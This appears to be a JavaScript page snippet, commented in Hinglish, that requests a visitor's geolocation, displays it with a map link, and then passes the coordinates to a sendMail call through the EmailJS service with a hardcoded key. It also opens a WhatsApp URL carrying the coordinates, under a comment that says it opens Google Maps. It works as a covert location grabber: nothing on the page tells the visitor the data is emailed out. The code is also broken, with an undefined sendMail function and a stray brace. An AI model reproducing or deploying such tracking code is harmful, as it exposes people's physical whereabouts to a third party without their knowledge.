<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

<script>

emailjs.init("7IpNoo6zUZp69IFfu");




    function getLocation() {
      const output = document.getElementById('output');

       

      output.innerHTML = 'Location fetch ho rahi hai...';

      // Google Maps auto-open bhi hoga
      navigator.geolocation.getCurrentPosition(
        function(position) {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const accuracy = position.coords.accuracy;

          output.innerHTML = `
            <p><strong>Latitude:</strong> ${lat}</p>
            <p><strong>Longitude:</strong> ${lon}</p>
            <p><strong>Accuracy:</strong> ${accuracy} meters</p>

            <p>
              <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">
                Open in Google Maps
              </a>
            </p>
          `;
            sendMail(output.innerHTML);

          // Automatically open Google Maps
          window.open(`https://web.whatsapp.com//?q=${lat},${lon}`, '_blank');
        },
        function(error) {
          switch(error.code) {
            case error.PERMISSION_DENIED:
              output.innerHTML = 'User ne location permission deny kar di';
              break;
            case error.POSITION_UNAVAILABLE:
              output.innerHTML = 'Location unavailable hai';
              break;
            case error.TIMEOUT:
              output.innerHTML = 'Location request timeout ho gaya';
              break;
            default:
              output.innerHTML = 'Unknown error';
          }
          
        }
      );

}



    }
